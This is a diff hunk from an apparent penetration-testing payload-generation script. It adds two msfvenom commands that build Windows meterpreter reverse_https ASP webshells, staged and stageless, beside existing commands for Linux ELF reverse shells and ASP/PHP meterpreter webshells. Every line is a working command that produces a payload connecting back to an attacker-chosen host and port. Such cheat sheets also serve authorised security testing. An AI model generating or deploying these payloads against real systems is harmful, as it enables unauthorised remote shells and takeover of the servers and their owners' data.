@@ -30,11 +30,13 @@ msfvenom -p linux/x86/shell/reverse_tcp LHOST=$HOST LPORT=$PORT -f elf > shell_r
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=$HOST LPORT=$PORT -f elf > stageless_shell_revtcp_$HOST-$PORT.elf
 
 # Webshells (staged)
+msfvenom -p windows/meterpreter/reverse_https LHOST=$HOST LPORT=$PORT -f asp > meterp_revhttps_$HOST-$PORT.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > meterp_revtcp_$HOST-$PORT.asp
 msfvenom -p windows/shell/reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > shell_revtcp_$HOST-$PORT.asp
 msfvenom -p php/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f raw > meterp_revtcp_$HOST-$PORT.php
 
 # Webshells (stageless)
+msfvenom -p windows/meterpreter_reverse_https LHOST=$HOST LPORT=$PORT -f asp > stageless_meterp_revhttps_$HOST-$PORT.asp
 msfvenom -p windows/meterpreter_reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > stageless_meterp_revtcp_$HOST-$PORT.asp
 msfvenom -p windows/shell_reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > stageless_shell_revtcp_$HOST-$PORT.asp
 msfvenom -p php/meterpreter_reverse_tcp LHOST=$HOST LPORT=$PORT -f raw > stageless_meterp_revtcp_$HOST-$PORT.php
